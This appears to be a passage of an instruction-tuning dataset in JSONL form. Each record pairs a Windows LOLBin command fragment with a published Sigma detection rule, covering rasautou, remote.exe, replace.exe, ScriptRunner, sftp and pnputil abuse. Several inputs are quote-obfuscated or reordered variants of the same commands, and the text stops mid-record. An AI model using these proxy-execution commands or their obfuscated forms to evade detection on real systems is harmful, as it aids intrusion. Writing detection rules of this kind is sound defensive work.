{"instruction": "Write Sigma rule to detect payload:", "input": "\\rasautou.exe rasdlui.exe -d -p", "output": "title: DLL Execution via Rasautou.exe\nid: cd3d1298-eb3b-476c-ac67-12847de55813\nstatus: test\ndescription: Detects using Rasautou.exe for loading arbitrary .DLL specified in -d option and executes the export specified in -p.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Rasautou/\n    - https://github.com/fireeye/DueDLLigence\n    - https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html\nauthor: Julia Fomina, oscd.community\ndate: 2020-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\n    definition: Since options '-d' and '-p' were removed in Windows 10 this rule is relevant only for Windows before 10. And as Windows 7 doesn't log command line in 4688 by default, to detect this attack you need Sysmon 1 configured or KB3004375 installed for command-line auditing (https://support.microsoft.com/en-au/help/3004375/microsoft-security-advisory-update-to-improve-windows-command-line-aud)\ndetection:\n    selection_img:\n        - Image|endswith: '\\rasautou.exe'\n        - OriginalFileName: 'rasdlui.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -d '\n            - ' -p '\n    condition: all of selection*\nfalsepositives:\n    - Unlikely\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rasautou.exe rasdlui.exe \\\"-d\\\" -p", "output": "title: DLL Execution via Rasautou.exe\nid: cd3d1298-eb3b-476c-ac67-12847de55813\nstatus: test\ndescription: Detects using Rasautou.exe for loading arbitrary .DLL specified in -d option and executes the export specified in -p.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Rasautou/\n    - https://github.com/fireeye/DueDLLigence\n    - https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html\nauthor: Julia Fomina, oscd.community\ndate: 2020-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\n    definition: Since options '-d' and '-p' were removed in Windows 10 this rule is relevant only for Windows before 10. And as Windows 7 doesn't log command line in 4688 by default, to detect this attack you need Sysmon 1 configured or KB3004375 installed for command-line auditing (https://support.microsoft.com/en-au/help/3004375/microsoft-security-advisory-update-to-improve-windows-command-line-aud)\ndetection:\n    selection_img:\n        - Image|endswith: '\\rasautou.exe'\n        - OriginalFileName: 'rasdlui.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -d '\n            - ' -p '\n    condition: all of selection*\nfalsepositives:\n    - Unlikely\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rasautou rasdlui -d -p", "output": "title: DLL Execution via Rasautou.exe\nid: cd3d1298-eb3b-476c-ac67-12847de55813\nstatus: test\ndescription: Detects using Rasautou.exe for loading arbitrary .DLL specified in -d option and executes the export specified in -p.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Rasautou/\n    - https://github.com/fireeye/DueDLLigence\n    - https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html\nauthor: Julia Fomina, oscd.community\ndate: 2020-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\n    definition: Since options '-d' and '-p' were removed in Windows 10 this rule is relevant only for Windows before 10. And as Windows 7 doesn't log command line in 4688 by default, to detect this attack you need Sysmon 1 configured or KB3004375 installed for command-line auditing (https://support.microsoft.com/en-au/help/3004375/microsoft-security-advisory-update-to-improve-windows-command-line-aud)\ndetection:\n    selection_img:\n        - Image|endswith: '\\rasautou.exe'\n        - OriginalFileName: 'rasdlui.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -d '\n            - ' -p '\n    condition: all of selection*\nfalsepositives:\n    - Unlikely\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\rasautou.exe -d rasdlui.exe -p", "output": "title: DLL Execution via Rasautou.exe\nid: cd3d1298-eb3b-476c-ac67-12847de55813\nstatus: test\ndescription: Detects using Rasautou.exe for loading arbitrary .DLL specified in -d option and executes the export specified in -p.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Rasautou/\n    - https://github.com/fireeye/DueDLLigence\n    - https://www.fireeye.com/blog/threat-research/2019/10/staying-hidden-on-the-endpoint-evading-detection-with-shellcode.html\nauthor: Julia Fomina, oscd.community\ndate: 2020-10-09\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    product: windows\n    category: process_creation\n    definition: Since options '-d' and '-p' were removed in Windows 10 this rule is relevant only for Windows before 10. And as Windows 7 doesn't log command line in 4688 by default, to detect this attack you need Sysmon 1 configured or KB3004375 installed for command-line auditing (https://support.microsoft.com/en-au/help/3004375/microsoft-security-advisory-update-to-improve-windows-command-line-aud)\ndetection:\n    selection_img:\n        - Image|endswith: '\\rasautou.exe'\n        - OriginalFileName: 'rasdlui.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' -d '\n            - ' -p '\n    condition: all of selection*\nfalsepositives:\n    - Unlikely\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\register_app.vbs -register", "output": "title: REGISTER_APP.VBS Proxy Execution\nid: 1c8774a0-44d4-4db0-91f8-e792359c70bd\nstatus: test\ndescription: Detects the use of a Microsoft signed script 'REGISTER_APP.VBS' to register a VSS/VDS Provider as a COM+ application.\nreferences:\n    - https://twitter.com/sblmsrsn/status/1456613494783160325?s=20\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\register_app.vbs'\n            - '-register'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the script. Always investigate what's being registered to confirm if it's benign\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\register_app.vbs \"-register\"", "output": "title: REGISTER_APP.VBS Proxy Execution\nid: 1c8774a0-44d4-4db0-91f8-e792359c70bd\nstatus: test\ndescription: Detects the use of a Microsoft signed script 'REGISTER_APP.VBS' to register a VSS/VDS Provider as a COM+ application.\nreferences:\n    - https://twitter.com/sblmsrsn/status/1456613494783160325?s=20\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\register_app.vbs'\n            - '-register'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the script. Always investigate what's being registered to confirm if it's benign\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\register_app -register", "output": "title: REGISTER_APP.VBS Proxy Execution\nid: 1c8774a0-44d4-4db0-91f8-e792359c70bd\nstatus: test\ndescription: Detects the use of a Microsoft signed script 'REGISTER_APP.VBS' to register a VSS/VDS Provider as a COM+ application.\nreferences:\n    - https://twitter.com/sblmsrsn/status/1456613494783160325?s=20\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\register_app.vbs'\n            - '-register'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the script. Always investigate what's being registered to confirm if it's benign\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\register_app.vbs -register", "output": "title: REGISTER_APP.VBS Proxy Execution\nid: 1c8774a0-44d4-4db0-91f8-e792359c70bd\nstatus: test\ndescription: Detects the use of a Microsoft signed script 'REGISTER_APP.VBS' to register a VSS/VDS Provider as a COM+ application.\nreferences:\n    - https://twitter.com/sblmsrsn/status/1456613494783160325?s=20\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-08-19\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\register_app.vbs'\n            - '-register'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of the script. Always investigate what's being registered to confirm if it's benign\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\remote.exe remote.exe", "output": "title: Use of Remote.exe\nid: 4eddc365-79b4-43ff-a9d7-99422dc34b93\nstatus: test\ndescription: Remote.exe is part of WinDbg in the Windows SDK and can be used for AWL bypass and running remote files.\nreferences:\n    - https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Remote/\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022-06-02\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\remote.exe'\n        - OriginalFileName: 'remote.exe'\n    condition: selection\nfalsepositives:\n    - Approved installs of Windows SDK with Debugging Tools for Windows (WinDbg).\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\remote.exe \\\"remot\\\"e.exe", "output": "title: Use of Remote.exe\nid: 4eddc365-79b4-43ff-a9d7-99422dc34b93\nstatus: test\ndescription: Remote.exe is part of WinDbg in the Windows SDK and can be used for AWL bypass and running remote files.\nreferences:\n    - https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Remote/\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022-06-02\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\remote.exe'\n        - OriginalFileName: 'remote.exe'\n    condition: selection\nfalsepositives:\n    - Approved installs of Windows SDK with Debugging Tools for Windows (WinDbg).\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\remote remote", "output": "title: Use of Remote.exe\nid: 4eddc365-79b4-43ff-a9d7-99422dc34b93\nstatus: test\ndescription: Remote.exe is part of WinDbg in the Windows SDK and can be used for AWL bypass and running remote files.\nreferences:\n    - https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Remote/\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022-06-02\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\remote.exe'\n        - OriginalFileName: 'remote.exe'\n    condition: selection\nfalsepositives:\n    - Approved installs of Windows SDK with Debugging Tools for Windows (WinDbg).\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\remote.exe remote.exe", "output": "title: Use of Remote.exe\nid: 4eddc365-79b4-43ff-a9d7-99422dc34b93\nstatus: test\ndescription: Remote.exe is part of WinDbg in the Windows SDK and can be used for AWL bypass and running remote files.\nreferences:\n    - https://blog.thecybersecuritytutor.com/Exeuction-AWL-Bypass-Remote-exe-LOLBin/\n    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Remote/\nauthor: 'Christopher Peacock @SecurePeacock, SCYTHE @scythe_io'\ndate: 2022-06-02\ntags:\n    - attack.defense-evasion\n    - attack.t1127\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\remote.exe'\n        - OriginalFileName: 'remote.exe'\n    condition: selection\nfalsepositives:\n    - Approved installs of Windows SDK with Debugging Tools for Windows (WinDbg).\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\replace.exe -a", "output": "title: Replace.exe Usage\nid: 9292293b-8496-4715-9db6-37028dcda4b3\nstatus: test\ndescription: Detects the use of Replace.exe which can be used to replace file with another file\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Replace/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/replace\nauthor: frack113\ndate: 2022-03-06\nmodified: 2024-03-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\replace.exe'\n    argument:\n        CommandLine|contains|windash: '-a'\n    condition: selection and argument\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\replace.exe\" -a", "output": "title: Replace.exe Usage\nid: 9292293b-8496-4715-9db6-37028dcda4b3\nstatus: test\ndescription: Detects the use of Replace.exe which can be used to replace file with another file\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Replace/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/replace\nauthor: frack113\ndate: 2022-03-06\nmodified: 2024-03-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\replace.exe'\n    argument:\n        CommandLine|contains|windash: '-a'\n    condition: selection and argument\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\replace -a", "output": "title: Replace.exe Usage\nid: 9292293b-8496-4715-9db6-37028dcda4b3\nstatus: test\ndescription: Detects the use of Replace.exe which can be used to replace file with another file\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Replace/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/replace\nauthor: frack113\ndate: 2022-03-06\nmodified: 2024-03-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\replace.exe'\n    argument:\n        CommandLine|contains|windash: '-a'\n    condition: selection and argument\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\replace.exe -a", "output": "title: Replace.exe Usage\nid: 9292293b-8496-4715-9db6-37028dcda4b3\nstatus: test\ndescription: Detects the use of Replace.exe which can be used to replace file with another file\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Replace/\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/replace\nauthor: frack113\ndate: 2022-03-06\nmodified: 2024-03-13\ntags:\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\replace.exe'\n    argument:\n        CommandLine|contains|windash: '-a'\n    condition: selection and argument\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Runscripthelper.exe surfacecheck", "output": "title: Suspicious Runscripthelper.exe\nid: eca49c87-8a75-4f13-9c73-a5a29e845f03\nstatus: test\ndescription: Detects execution of powershell scripts via Runscripthelper.exe\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Runscripthelper/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2022-07-11\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Runscripthelper.exe'\n        CommandLine|contains: 'surfacecheck'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Runscripthelper.exe surfac\\\"echeck\\\"", "output": "title: Suspicious Runscripthelper.exe\nid: eca49c87-8a75-4f13-9c73-a5a29e845f03\nstatus: test\ndescription: Detects execution of powershell scripts via Runscripthelper.exe\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Runscripthelper/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2022-07-11\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Runscripthelper.exe'\n        CommandLine|contains: 'surfacecheck'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Runscripthelper surfacecheck", "output": "title: Suspicious Runscripthelper.exe\nid: eca49c87-8a75-4f13-9c73-a5a29e845f03\nstatus: test\ndescription: Detects execution of powershell scripts via Runscripthelper.exe\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Runscripthelper/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2022-07-11\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Runscripthelper.exe'\n        CommandLine|contains: 'surfacecheck'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\Runscripthelper.exe surfacecheck", "output": "title: Suspicious Runscripthelper.exe\nid: eca49c87-8a75-4f13-9c73-a5a29e845f03\nstatus: test\ndescription: Detects execution of powershell scripts via Runscripthelper.exe\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Runscripthelper/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2022-07-11\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\Runscripthelper.exe'\n        CommandLine|contains: 'surfacecheck'\n    condition: selection\nfields:\n    - CommandLine\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ScriptRunner.exe ScriptRunner.exe -appvscript", "output": "title: Use of Scriptrunner.exe\nid: 64760eef-87f7-4ed3-93fd-655668ea9420\nstatus: test\ndescription: The \"ScriptRunner.exe\" binary can be abused to proxy execution through it and bypass possible whitelisting\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-01\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ScriptRunner.exe'\n        - OriginalFileName: 'ScriptRunner.exe'\n    selection_cli:\n        CommandLine|contains: ' -appvscript '\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use when App-v is deployed\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ScriptRunner.exe ScriptRu\"nner.exe\" -appvscript", "output": "title: Use of Scriptrunner.exe\nid: 64760eef-87f7-4ed3-93fd-655668ea9420\nstatus: test\ndescription: The \"ScriptRunner.exe\" binary can be abused to proxy execution through it and bypass possible whitelisting\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-01\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ScriptRunner.exe'\n        - OriginalFileName: 'ScriptRunner.exe'\n    selection_cli:\n        CommandLine|contains: ' -appvscript '\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use when App-v is deployed\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ScriptRunner ScriptRunner -appvscript", "output": "title: Use of Scriptrunner.exe\nid: 64760eef-87f7-4ed3-93fd-655668ea9420\nstatus: test\ndescription: The \"ScriptRunner.exe\" binary can be abused to proxy execution through it and bypass possible whitelisting\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-01\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ScriptRunner.exe'\n        - OriginalFileName: 'ScriptRunner.exe'\n    selection_cli:\n        CommandLine|contains: ' -appvscript '\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use when App-v is deployed\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ScriptRunner.exe -appvscript ScriptRunner.exe", "output": "title: Use of Scriptrunner.exe\nid: 64760eef-87f7-4ed3-93fd-655668ea9420\nstatus: test\ndescription: The \"ScriptRunner.exe\" binary can be abused to proxy execution through it and bypass possible whitelisting\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-01\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\ScriptRunner.exe'\n        - OriginalFileName: 'ScriptRunner.exe'\n    selection_cli:\n        CommandLine|contains: ' -appvscript '\n    condition: all of selection*\nfalsepositives:\n    - Legitimate use when App-v is deployed\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sftp.exe -D .. -D C:\\", "output": "title: Use Of The SFTP.EXE Binary As A LOLBIN\nid: a85ffc3a-e8fd-4040-93bf-78aff284d801\nstatus: test\ndescription: Detects the usage of the \"sftp.exe\" binary as a LOLBIN by abusing the \"-D\" flag\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/264\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-11-10\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sftp.exe' # The \"sftp.exe\" located in the OpenSSH directory has no OriginalFileName :(\n        CommandLine|contains:\n            # Since \"-D\" is a valid flag for other usage we assume the user is going to enter a path\n            # Either a full one like \"C:\\Windows\\System32\\calc.exe\" or a relative one \"..\\..\\..\\Windows\\System32\\calc.exe\"\n            # In my testing you can't execute direct binaries by their name via this method (if you found a way please update the rule)\n            - ' -D ..'\n            - ' -D C:\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sftp.exe -D .. -D \\\"C\\\"\\\":\\\"\\\"\\\\\"", "output": "title: Use Of The SFTP.EXE Binary As A LOLBIN\nid: a85ffc3a-e8fd-4040-93bf-78aff284d801\nstatus: test\ndescription: Detects the usage of the \"sftp.exe\" binary as a LOLBIN by abusing the \"-D\" flag\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/264\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-11-10\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sftp.exe' # The \"sftp.exe\" located in the OpenSSH directory has no OriginalFileName :(\n        CommandLine|contains:\n            # Since \"-D\" is a valid flag for other usage we assume the user is going to enter a path\n            # Either a full one like \"C:\\Windows\\System32\\calc.exe\" or a relative one \"..\\..\\..\\Windows\\System32\\calc.exe\"\n            # In my testing you can't execute direct binaries by their name via this method (if you found a way please update the rule)\n            - ' -D ..'\n            - ' -D C:\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sftp -D .. -D C:\\", "output": "title: Use Of The SFTP.EXE Binary As A LOLBIN\nid: a85ffc3a-e8fd-4040-93bf-78aff284d801\nstatus: test\ndescription: Detects the usage of the \"sftp.exe\" binary as a LOLBIN by abusing the \"-D\" flag\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/264\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-11-10\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sftp.exe' # The \"sftp.exe\" located in the OpenSSH directory has no OriginalFileName :(\n        CommandLine|contains:\n            # Since \"-D\" is a valid flag for other usage we assume the user is going to enter a path\n            # Either a full one like \"C:\\Windows\\System32\\calc.exe\" or a relative one \"..\\..\\..\\Windows\\System32\\calc.exe\"\n            # In my testing you can't execute direct binaries by their name via this method (if you found a way please update the rule)\n            - ' -D ..'\n            - ' -D C:\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sftp.exe C:\\ .. -D -D", "output": "title: Use Of The SFTP.EXE Binary As A LOLBIN\nid: a85ffc3a-e8fd-4040-93bf-78aff284d801\nstatus: test\ndescription: Detects the usage of the \"sftp.exe\" binary as a LOLBIN by abusing the \"-D\" flag\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/pull/264\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-11-10\ntags:\n    - attack.defense-evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sftp.exe' # The \"sftp.exe\" located in the OpenSSH directory has no OriginalFileName :(\n        CommandLine|contains:\n            # Since \"-D\" is a valid flag for other usage we assume the user is going to enter a path\n            # Either a full one like \"C:\\Windows\\System32\\calc.exe\" or a relative one \"..\\..\\..\\Windows\\System32\\calc.exe\"\n            # In my testing you can't execute direct binaries by their name via this method (if you found a way please update the rule)\n            - ' -D ..'\n            - ' -D C:\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-i /install -a /add-driver .inf \\pnputil.exe", "output": "title: Suspicious Driver Install by pnputil.exe\nid: a2ea3ae7-d3d0-40a0-a55c-25a45c87cac1\nstatus: test\ndescription: Detects when a possible suspicious driver is being installed via pnputil.exe lolbin\nreferences:\n    - https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/pnputil-command-syntax\n    - https://strontic.github.io/xcyclopedia/library/pnputil.exe-60EDC5E6BDBAEE441F2E3AEACD0340D2.html\nauthor: Hai Vaknin @LuxNoBulIshit, Avihay eldad  @aloneliassaf, Austin Songer @austinsonger\ndate: 2021-09-30\nmodified: 2022-10-09\ntags:\n    - attack.persistence\n    - attack.t1547\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '-i'\n            - '/install'\n            - '-a'\n            - '/add-driver'\n            - '.inf'\n        Image|endswith: '\\pnputil.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Pnputil.exe being used may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Pnputil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-i /install -a /add-driver \\\".inf\\\" \\pnputil.exe", "output": "title: Suspicious Driver Install by pnputil.exe\nid: a2ea3ae7-d3d0-40a0-a55c-25a45c87cac1\nstatus: test\ndescription: Detects when a possible suspicious driver is being installed via pnputil.exe lolbin\nreferences:\n    - https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/pnputil-command-syntax\n    - https://strontic.github.io/xcyclopedia/library/pnputil.exe-60EDC5E6BDBAEE441F2E3AEACD0340D2.html\nauthor: Hai Vaknin @LuxNoBulIshit, Avihay eldad  @aloneliassaf, Austin Songer @austinsonger\ndate: 2021-09-30\nmodified: 2022-10-09\ntags:\n    - attack.persistence\n    - attack.t1547\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '-i'\n            - '/install'\n            - '-a'\n            - '/add-driver'\n            - '.inf'\n        Image|endswith: '\\pnputil.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Pnputil.exe being used may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Pnputil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-i /install -a /add-driver .inf \\pnputil", "output": "title: Suspicious Driver Install by pnputil.exe\nid: a2ea3ae7-d3d0-40a0-a55c-25a45c87cac1\nstatus: test\ndescription: Detects when a possible suspicious driver is being installed via pnputil.exe lolbin\nreferences:\n    - https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/pnputil-command-syntax\n    - https://strontic.github.io/xcyclopedia/library/pnputil.exe-60EDC5E6BDBAEE441F2E3AEACD0340D2.html\nauthor: Hai Vaknin @LuxNoBulIshit, Avihay eldad  @aloneliassaf, Austin Songer @austinsonger\ndate: 2021-09-30\nmodified: 2022-10-09\ntags:\n    - attack.persistence\n    - attack.t1547\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '-i'\n            - '/install'\n            - '-a'\n            - '/add-driver'\n            - '.inf'\n        Image|endswith: '\\pnputil.exe'\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Pnputil.exe being used may be performed by a system administrator.\n    - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - Pnputil.exe being executed from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from 